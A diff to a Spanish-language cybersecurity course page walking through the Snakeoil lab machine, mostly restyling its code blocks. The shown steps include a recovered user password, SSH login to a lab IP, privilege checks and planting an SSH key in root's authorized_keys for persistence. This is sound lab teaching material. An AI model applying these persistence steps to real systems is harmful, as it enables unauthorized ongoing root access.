@@ -6,6 +6,47 @@
     <title>Walkthrough Snakeoil - Parcial 1 | Fundamentos de Ciberseguridad</title>
     <link rel="stylesheet" href="../style.css">
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;1,400&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- ESTILOS PARA LOS BLOQUES DE CÓDIGO (ESTILO TERMINAL) --- */
+        pre {
+            background-color: #1a1b26; /* Fondo oscuro (estilo Tokyo Night) */
+            color: #a9b1d6; /* Color de texto base claro */
+            padding: 16px 20px;
+            border-radius: 8px;
+            overflow-x: auto; /* Scroll horizontal si el texto es muy largo */
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); /* Sombra elegante */
+            border-left: 4px solid #00ffcc; /* Detalle de color cyan (Ciberseguridad) */
+            margin: 20px 0;
+        }
+
+        /* Color para los comandos para que resalten más */
+        pre code {
+            color: #00ffcc; /* Color cyan brillante para el texto del código */
+            text-shadow: 0px 0px 3px rgba(0, 255, 204, 0.2); /* Efecto ligero de brillo */
+        }
+
+        /* Personalización de la barra de desplazamiento (Scrollbar) para los bloques de código */
+        pre::-webkit-scrollbar {
+            height: 8px;
+        }
+        pre::-webkit-scrollbar-track {
+            background: #101014;
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+        }
+        pre::-webkit-scrollbar-thumb {
+            background: #414868;
+            border-radius: 4px;
+        }
+        pre::-webkit-scrollbar-thumb:hover {
+            background: #00ffcc;
+        }
+        /* ----------------------------------------------------------- */
+    </style>
 </head>
 <body>
     <div class="side-ornament left"></div>
@@ -97,8 +138,8 @@
                 <p>Se obtuvo la contraseña del usuario patrick: <strong>NOreasonableDOUBTthisPASSWORDisGOOD</strong></p>
 
                 <h4>4. Acceso Inicial y Escalada de Privilegios</h4>
-                <pre><code>ssh patrick@192.168.56.103</code></pre>
-                <pre><code>whoami
+                <pre><code>ssh patrick@192.168.56.103
+whoami
 id
 cat ~/local.txt
 sudo -l
@@ -111,8 +152,8 @@ cat /root/proof.txt</code></pre>
                 <h4>5. Post-Explotación (Persistencia)</h4>
                 
                 <p><strong>Generación de llave SSH (desde Kali):</strong></p>
-                <pre><code>ssh-keygen -t ed25519 -f snakeoil_root -N ""</code></pre>
-                <pre><code>cat snakeoil_root.pub</code></pre>
+                <pre><code>ssh-keygen -t ed25519 -f snakeoil_root -N ""
+cat snakeoil_root.pub</code></pre>
 
                 <p><strong>Instalación de la llave (en la máquina objetivo):</strong></p>
                 <pre><code>mkdir -p /root/.ssh
@@ -121,8 +162,8 @@ chmod 700 /root/.ssh
 chmod 600 /root/.ssh/authorized_keys</code></pre>
 
                 <p><strong>Verificación de persistencia:</strong></p>
-                <pre><code>ssh -i snakeoil_root root@192.168.56.103</code></pre>
-                <pre><code>whoami
+                <pre><code>ssh -i snakeoil_root root@192.168.56.103
+whoami
 id
 cat /root/proof.txt</code></pre>
             </section>
@@ -144,21 +185,6 @@ cat /root/proof.txt</code></pre>
                     ofensiva y su aplicación práctica en un entorno controlado.
                 </p>
             </section>
-
-            <!-- 
-            <section class="evidence-card">
-                <div class="card-number">VIDEO</div>
-                <h3>Video Walkthrough</h3>
-                <p>A continuación se presenta el video completo del walkthrough:</p>
-                
-                <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%;">
-                    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" 
-                            src="AQUI_VA_EL_LINK_DEL_VIDEO" 
-                            frameborder="0" allowfullscreen>
-                    </iframe>
-                </div>
-            </section>
-            -->
 
         </main>
 
